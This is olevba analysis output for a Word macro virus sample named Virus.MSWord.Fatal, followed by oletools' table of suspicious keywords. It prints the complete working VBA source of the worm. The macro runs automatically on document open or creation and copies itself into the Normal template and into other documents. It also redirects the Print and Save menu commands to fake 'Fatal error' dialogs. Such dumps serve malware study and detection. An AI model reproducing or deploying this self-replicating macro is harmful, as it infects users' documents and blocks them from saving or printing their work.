olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fatal-de981eb632e4cd065ba7da0ea738d882dd90571b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fatal-de981eb632e4cd065ba7da0ea738d882dd90571b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'#WORM#
Private preventSave As Boolean
Private Sub Document_New()
preventSave = True
On Error Resume Next
Document_Open
End Sub
Private Sub WORMprint()
On Error Resume Next
MsgBox "Cannot print this document." + vbLf + "Server does not response.", vbCritical Or vbSystemModal, "Fatal error"
End Sub
Private Sub WORMsave()
On Error Resume Next
MsgBox "Cannot save this document." + vbLf + "Disk might be damaged or read protected.", vbCritical Or vbSystemModal, "Fatal error"
End Sub
Private Sub Document_Open()
On Error Resume Next
Set adoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set ntem = NormalTemplate.VBProject.VBComponents.Item(1)
CommandBars("file").Controls("Печать...").OnAction = "WORMprint"
CommandBars("standard").Controls("Печать").OnAction = "WORMprint"
CommandBars("file").Controls("Сохранить").OnAction = "WORMsave"
CommandBars("standard").Controls("Сохранить").OnAction = "WORMsave"
If adoc.CodeModule.lines(1, 1) <> "'#WORM#" Then
    BGN = 1: adoc.CodeModule.DeleteLines 1, adoc.CodeModule.CountOfLines
    Do: adoc.CodeModule.insertlines BGN, ntem.CodeModule.lines(BGN, 1)
    BGN = BGN + 1
    Loop Until ntem.CodeModule.lines(BGN, 1) = ""
    If Not preventSave Then
        If Not ActiveDocument.ReadOnly Then
            If ActiveDocument.ReadOnlyRecommended Then ActiveDocument.ReadOnlyRecommended = False
            ActiveDocument.Save
        End If
    End If
End If
If ntem.CodeModule.lines(1, 1) <> "'#WORM#" Then
    BGN = 1: ntem.CodeModule.DeleteLines 1, ntem.CodeModule.CountOfLines
    Do: ntem.CodeModule.insertlines BGN, adoc.CodeModule.lines(BGN, 1)
    BGN = BGN + 1
    Loop Until adoc.CodeModule.lines(BGN, 1) = ""
End If
preventSave = False
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |~)^                 |file                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

